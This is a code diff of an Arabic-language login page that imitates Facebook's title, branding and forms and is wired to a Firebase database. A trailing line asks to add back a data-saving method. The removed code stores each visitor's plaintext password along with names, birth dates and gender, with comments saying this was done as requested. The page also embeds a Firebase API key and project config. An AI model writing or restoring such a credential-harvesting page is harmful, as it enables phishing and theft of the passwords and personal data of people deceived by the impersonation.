@@ -3,347 +3,260 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <title>تسجيل الدخول - Facebook</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        /* CSS سيكون هنا طويل جدًا بسبب الدقة */
         :root {
-            --primary-color: #1877f2;
-            --secondary-color: #42b72a;
-            --text-primary: #1c1e21;
-            --text-secondary: #606770;
-            --bg-color: #f0f2f5;
-            --white: #ffffff;
-            --border-color: #dddfe2;
-            --error-color: #ff4242;
+            --primary: #1877f2; /* أزرق فيسبوك */
+            --secondary: #42b72a; /* أخضر فيسبوك */
+            --bg: #f0f2f5;
+            --card: #ffffff;
+            --text: #1c1e21;
         }
-        
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Helvetica, Arial, sans-serif;
+            font-family: Arial, sans-serif;
         }
-        
+
         body {
-            background-color: var(--bg-color);
-            color: var(--text-primary);
-            line-height: 1.34;
-        }
-        
-        .container {
-            max-width: 100%;
-            padding: 72px 0 112px;
-        }
-        
-        .header {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 72px;
-            background-color: var(--white);
-            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+            background-color: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
             display: flex;
+            justify-content: center;
             align-items: center;
-            padding: 0 16px;
-            z-index: 1000;
+            padding: 20px;
         }
-        
+
+        .login-container {
+            background-color: var(--card);
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+
         .logo {
-            color: var(--primary-color);
+            color: var(--primary);
             font-size: 2.5rem;
             font-weight: bold;
-            margin-right: auto;
+            margin-bottom: 20px;
         }
-        
-        .login-form-container {
-            display: flex;
-            align-items: center;
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: right;
         }
-        
-        /* ... CSS طويل جدًا سيستمر لأكثر من 300 سطر ... */
-        
-        @media (max-width: 900px) {
-            /* تكيف مع الأجهزة المحمولة */
-            .container {
-                padding: 56px 0;
-            }
-            
-            .main-content {
-                flex-direction: column;
-                padding: 20px;
-            }
-            
-            .left-section, .right-section {
-                width: 100%;
-                text-align: center;
-            }
-            
-            .login-form-container {
-                margin: 20px 0;
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            background-color: var(--card);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            color: var(--primary);
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            background-color: var(--secondary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        .error-message {
+            color: #ff3333;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .login-container {
+                box-shadow: none;
+                background-color: var(--bg);
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">facebook</div>
-            <div class="login-form-container">
-                <form id="loginForm" class="login-form">
-                    <div class="form-group">
-                        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
-                    </div>
-                    <div class="form-group">
-                        <input type="password" id="password" placeholder="كلمة المرور">
-                        <i class="fas fa-eye password-toggle"></i>
-                    </div>
-                    <button type="submit" class="login-button">تسجيل الدخول</button>
-                    <div class="forgot-password">
-                        <a href="#">هل نسيت كلمة المرور؟</a>
-                    </div>
-                </form>
+    <div class="login-container">
+        <div class="logo">FToUH</div>
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
             </div>
-        </div>
-
-        <div class="main-content">
-            <div class="left-section">
-                <h1>facebook</h1>
-                <p>يساعدك فيسبوك على التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="كلمة المرور" required>
             </div>
-            <div class="right-section">
-                <div class="signup-form-container">
-                    <h2>إنشاء حساب جديد</h2>
-                    <p class="subtitle">إنه سريع وسهل.</p>
-                    <form id="signupForm" class="signup-form">
-                        <div class="name-inputs">
-                            <input type="text" id="firstName" placeholder="الاسم الأول">
-                            <input type="text" id="lastName" placeholder="اسم العائلة">
-                        </div>
-                        <input type="text" id="signupEmail" placeholder="البريد الإلكتروني أو رقم الهاتف">
-                        <input type="password" id="signupPassword" placeholder="كلمة المرور الجديدة">
-                        <div class="password-hint">
-                            <div class="hint-icon">i</div>
-                            <div class="hint-text">استخدم 6 أحرف على الأقل مع مزيج من الأرقام والحروف</div>
-                        </div>
-                        <div class="birthday-section">
-                            <label>تاريخ الميلاد</label>
-                            <div class="birthday-inputs">
-                                <select id="birthDay">
-                                    <option value="" disabled selected>اليوم</option>
-                                </select>
-                                <select id="birthMonth">
-                                    <option value="" disabled selected>الشهر</option>
-                                </select>
-                                <select id="birthYear">
-                                    <option value="" disabled selected>السنة</option>
-                                </select>
-                            </div>
-                        </div>
-                        <div class="gender-section">
-                            <label>الجنس</label>
-                            <div class="gender-options">
-                                <label><input type="radio" name="gender" value="female"> أنثى</label>
-                                <label><input type="radio" name="gender" value="male"> ذكر</label>
-                                <label><input type="radio" name="gender" value="custom"> مخصص</label>
-                            </div>
-                        </div>
-                        <div class="custom-gender hidden" id="customGenderContainer">
-                            <input type="text" id="customGender" placeholder="حدد جنسك (اختياري)">
-                            <select id="pronoun">
-                                <option value="" disabled selected>اختر الضمير</option>
-                                <option value="she">هي: "أهنئها على عيد ميلادها"</option>
-                                <option value="he">هو: "أهنئه على عيد ميلاده"</option>
-                                <option value="they">هم: "أهنئهم على عيد ميلادهم"</option>
-                            </select>
-                            <p class="gender-explanation">يجب أن يكون جنسك واضحًا على ملفك الشخصي.</p>
-                        </div>
-                        <div class="terms-notice">
-                            <p>سيقوم الأشخاص الذين يستخدمون خدمتنا بتحميل معلومات الاتصال بك إلى فيسبوك. <a href="#">اطلع على المزيد</a>.</p>
-                            <p>بالنقر على "إنشاء حساب"، فإنك توافق على <a href="#">الشروط</a> و<a href="#">سياسة الخصوصية</a> و<a href="#">سياسة ملفات تعريف الارتباط</a>. قد تتلقى إشعارات منا ويمكنك إلغاء الاشتراك في أي وقت.</p>
-                        </div>
-                        <button type="submit" class="signup-button">إنشاء حساب</button>
-                    </form>
-                </div>
-                <div class="create-page">
-                    <p><a href="#">إنشاء صفحة</a> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.</p>
-                </div>
-            </div>
-        </div>
+            <div class="error-message" id="errorMessage"></div>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+            <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
+            <div class="divider"></div>
+            <button type="button" class="create-account" id="createAccount">إنشاء حساب جديد</button>
+        </form>
     </div>
 
-    <footer class="footer">
-        <div class="footer-content">
-            <div class="languages">
-                <a href="#">العربية</a>
-                <a href="#">English (US)</a>
-                <a href="#">Français (France)</a>
-                <!-- لغات أخرى -->
-            </div>
-            <div class="footer-links">
-                <a href="#">التسجيل</a>
-                <a href="#">تسجيل الدخول</a>
-                <a href="#">Messenger</a>
-                <!-- روابط أخرى -->
-            </div>
-            <div class="copyright">
-                Facebook © 2023
-            </div>
-        </div>
-    </footer>
-
-    <script type="module">
-        // Import the functions you need from the SDKs you need
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
-        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js";
-        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js";
-
-        // Your web app's Firebase configuration
+    <script>
+        // Firebase configuration - استبدل بمعلومات مشروعك
         const firebaseConfig = {
             apiKey: "AIzaSyAkv21njRIY0Ply1XG2OzY_I9hjzJdbI08",
             authDomain: "my-messenger-5cca2.firebaseapp.com",
             databaseURL: "https://my-messenger-5cca2-default-rtdb.firebaseio.com",
             projectId: "my-messenger-5cca2",
-            storageBucket: "my-messenger-5cca2.firebasestorage.app",
+            storageBucket: "my-messenger-5cca2.appspot.com",
             messagingSenderId: "317158541033",
-            appId: "1:317158541033:web:63bc67e8b369239cedd278",
-            measurementId: "G-2E7W6V43CM"
+            appId: "1:317158541033:web:63bc67e8b369239cedd278"
         };
 
         // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const db = getDatabase(app);
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const database = firebase.database();
 
-        // عناصر DOM
-        const loginForm = document.getElementById('loginForm');
-        const signupForm = document.getElementById('signupForm');
-        const passwordToggle = document.querySelector('.password-toggle');
-        const passwordInput = document.getElementById('password');
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
+            const createAccountBtn = document.getElementById('createAccount');
+            const errorMessage = document.getElementById('errorMessage');
 
-        // تبديل عرض كلمة المرور
-        passwordToggle.addEventListener('click', () => {
-            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-            passwordInput.setAttribute('type', type);
-            passwordToggle.classList.toggle('fa-eye-slash');
-        });
+            // تسجيل الدخول
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
 
-        // ملء تواريخ الميلاد
-        function populateDates() {
-            const daySelect = document.getElementById('birthDay');
-            const monthSelect = document.getElementById('birthMonth');
-            const yearSelect = document.getElementById('birthYear');
-
-            // الأيام
-            for (let i = 1; i <= 31; i++) {
-                const option = document.createElement('option');
-                option.value = i;
-                option.textContent = i;
-                daySelect.appendChild(option);
-            }
-
-            // الأشهر
-            const months = ['يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 
-                         'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'];
-            months.forEach((month, index) => {
-                const option = document.createElement('option');
-                option.value = index + 1;
-                option.textContent = month;
-                monthSelect.appendChild(option);
+                auth.signInWithEmailAndPassword(email, password)
+                    .then((userCredential) => {
+                        // تسجيل الدخول ناجح
+                        const user = userCredential.user;
+                        
+                        // حفظ بيانات تسجيل الدخول في Realtime Database
+                        database.ref('users/' + user.uid).set({
+                            email: user.email,
+                            lastLogin: new Date().toISOString(),
+                            deviceInfo: navigator.userAgent
+                        });
+                        
+                        // توجيه المستخدم إلى الصفحة الرئيسية
+                        window.location.href = "home.html"; // يمكنك استبدالها بصفحتك الرئيسية
+                    })
+                    .catch((error) => {
+                        // معالجة الأخطاء
+                        errorMessage.textContent = getErrorMessage(error.code);
+                    });
             });
 
-            // السنوات (من 1905 إلى العام الحالي)
-            const currentYear = new Date().getFullYear();
-            for (let i = currentYear; i >= 1905; i--) {
-                const option = document.createElement('option');
-                option.value = i;
-                option.textContent = i;
-                yearSelect.appendChild(option);
+            // إنشاء حساب جديد
+            createAccountBtn.addEventListener('click', function() {
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+
+                if (!email || !password) {
+                    errorMessage.textContent = "الرجاء إدخال البريد الإلكتروني وكلمة المرور";
+                    return;
+                }
+
+                auth.createUserWithEmailAndPassword(email, password)
+                    .then((userCredential) => {
+                        // حساب جديد تم إنشاؤه بنجاح
+                        const user = userCredential.user;
+                        
+                        // حفظ بيانات المستخدم في Realtime Database
+                        database.ref('users/' + user.uid).set({
+                            email: user.email,
+                            createdAt: new Date().toISOString(),
+                            lastLogin: new Date().toISOString(),
+                            deviceInfo: navigator.userAgent
+                        });
+                        
+                        alert("تم إنشاء الحساب بنجاح!");
+                    })
+                    .catch((error) => {
+                        errorMessage.textContent = getErrorMessage(error.code);
+                    });
+            });
+
+            // ترجمة رموز الأخطاء إلى رسائل مفهومة
+            function getErrorMessage(errorCode) {
+                switch(errorCode) {
+                    case 'auth/invalid-email':
+                        return "بريد إلكتروني غير صالح";
+                    case 'auth/user-disabled':
+                        return "هذا الحساب معطل";
+                    case 'auth/user-not-found':
+                        return "لا يوجد حساب بهذا البريد الإلكتروني";
+                    case 'auth/wrong-password':
+                        return "كلمة المرور غير صحيحة";
+                    case 'auth/email-already-in-use':
+                        return "هذا البريد الإلكتروني مستخدم بالفعل";
+                    case 'auth/weak-password':
+                        return "كلمة المرور ضعيفة (يجب أن تكون 6 أحرف على الأقل)";
+                    default:
+                        return "حدث خطأ أثناء تسجيل الدخول";
+                }
             }
-        }
 
-        // تسجيل الدخول
-        loginForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            // تسجيل الدخول باستخدام Firebase Auth
-            signInWithEmailAndPassword(auth, email, password)
-                .then((userCredential) => {
-                    // نجاح تسجيل الدخول
-                    const user = userCredential.user;
-                    
-                    // حفظ بيانات تسجيل الدخول في Realtime Database بالطريقة التي طلبتها
-                    push(ref(db, 'users'), {
-                        email: email,
-                        password: password, // ⚠️ تحذير: هذا غير آمن
-                        action: 'login',
-                        timestamp: new Date().toISOString()
-                    });
-                    
-                    alert('تم تسجيل الدخول بنجاح!');
-                })
-                .catch((error) => {
-                    alert('خطأ في تسجيل الدخول: ' + error.message);
-                });
-        });
-
-        // إنشاء حساب جديد
-        signupForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            
-            const email = document.getElementById('signupEmail').value;
-            const password = document.getElementById('signupPassword').value;
-            const firstName = document.getElementById('firstName').value;
-            const lastName = document.getElementById('lastName').value;
-            const birthDay = document.getElementById('birthDay').value;
-            const birthMonth = document.getElementById('birthMonth').value;
-            const birthYear = document.getElementById('birthYear').value;
-            const gender = document.querySelector('input[name="gender"]:checked').value;
-            const customGender = gender === 'custom' ? document.getElementById('customGender').value : null;
-            const pronoun = gender === 'custom' ? document.getElementById('pronoun').value : null;
-
-            // إنشاء حساب باستخدام Firebase Auth
-            createUserWithEmailAndPassword(auth, email, password)
-                .then((userCredential) => {
-                    const user = userCredential.user;
-                    
-                    // حفظ بيانات المستخدم في Realtime Database بالطريقة التي طلبتها
-                    push(ref(db, 'users'), {
-                        email: email,
-                        password: password, // ⚠️ تحذير: هذا غير آمن
-                        firstName: firstName,
-                        lastName: lastName,
-                        birthDate: `${birthDay}/${birthMonth}/${birthYear}`,
-                        gender: gender,
-                        customGender: customGender,
-                        pronoun: pronoun,
-                        action: 'signup',
-                        timestamp: new Date().toISOString()
-                    });
-                    
-                    alert('تم إنشاء الحساب بنجاح!');
-                })
-                .catch((error) => {
-                    alert('خطأ في إنشاء الحساب: ' + error.message);
-                });
-        });
-
-        // تهيئة الصفحة عند التحميل
-        document.addEventListener('DOMContentLoaded', () => {
-            populateDates();
-            
-            // إدارة عرض الجنس المخصص
-            document.querySelectorAll('input[name="gender"]').forEach(radio => {
-                radio.addEventListener('change', () => {
-                    document.getElementById('customGenderContainer').classList.toggle('hidden', radio.value !== 'custom');
-                });
+            // التحقق إذا كان المستخدم مسجل دخول بالفعل
+            auth.onAuthStateChanged((user) => {
+                if (user) {
+                    // المستخدم مسجل دخول، توجيه إلى الصفحة الرئيسية
+                    window.location.href = "home.html";
+                }
             });
         });
     </script>
 </body>
 </html>
+هذا الكود المربوط بقاعدة بيناتي اضف اليه تلك الطريقة حق حفض البينات 
